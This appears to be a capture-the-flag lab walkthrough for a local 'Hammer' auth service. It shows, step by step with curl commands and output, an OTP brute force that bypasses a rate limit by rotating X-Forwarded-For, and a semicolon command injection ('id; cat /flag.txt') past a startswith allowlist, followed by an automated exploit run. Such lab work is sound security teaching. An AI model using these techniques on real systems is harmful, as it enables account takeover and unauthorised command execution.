# Walkthrough: Hammer

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "Hammer Auth v1.0",
  "endpoints": [
    "POST /forgot-password   -- request OTP for email",
    "POST /reset-password    -- submit OTP to get session token",
    "POST /execute           -- run command (requires Authorization header)"
  ]
}
```

## Step 1: Request an OTP

```bash
curl -X POST http://localhost:8080/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hammer.local"}'
```

Output:
```json
{"message": "if that email exists, an OTP has been sent"}
```

## Step 2: Confirm the Rate Limit

Send 11 guesses without rotating the header:

```bash
for i in $(seq 1 11); do
  curl -s -X POST http://localhost:8080/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@hammer.local","otp":"0000"}'
  echo
done
```

After 10 attempts the server returns HTTP 429:
```json
{"error": "too many attempts, slow down"}
```

## Step 3: Bypass with X-Forwarded-For Rotation

The rate limiter reads `X-Forwarded-For` for the client IP. Rotate the value on each request:

```bash
for i in $(seq 0 9999); do
  OTP=$(printf "%04d" $i)
  FAKE_IP="10.0.$((i/256)).$((i%256))"
  RESP=$(curl -s -X POST http://localhost:8080/reset-password \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -d "{\"email\":\"admin@hammer.local\",\"otp\":\"$OTP\"}")
  TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
  if [ -n "$TOKEN" ]; then
    echo "OTP: $OTP  Token: $TOKEN"
    break
  fi
done
```

Output (OTP value varies per run):
```
OTP: 4271  Token: v8kqm3n7...
```

## Step 4: Probe the Execute Allowlist

```bash
TOKEN="<token from above>"

curl -X POST http://localhost:8080/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id"}'
```

Output:
```json
{"cmd": "id", "output": "uid=1000(app) gid=1000(app) groups=1000(app)"}
```

Try a blocked command:
```bash
curl -X POST http://localhost:8080/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"cat /flag.txt"}'
```

Output:
```json
{"error": "command not in allowlist: ['id', 'whoami', 'ls']"}
```

## Step 5: Bypass the Allowlist with a Semicolon

The check is `cmd.startswith("id")`. Append a second command after a semicolon:

```bash
curl -X POST http://localhost:8080/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id; cat /flag.txt"}'
```

Output:
```json
{"cmd": "id; cat /flag.txt", "output": "POC{...}"}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080

[*] Step 1: requesting OTP for admin@hammer.local
    200: if that email exists, an OTP has been sent

[*] Step 2: brute-forcing OTP (rotating X-Forwarded-For)...
    OTP found: 4271  token: v8kqm3n7...

[*] Step 3: exploiting startswith allowlist bypass
    command: 'id; cat /flag.txt'
    200: output = 'POC{...}'

[+] Flag: POC{...}
```
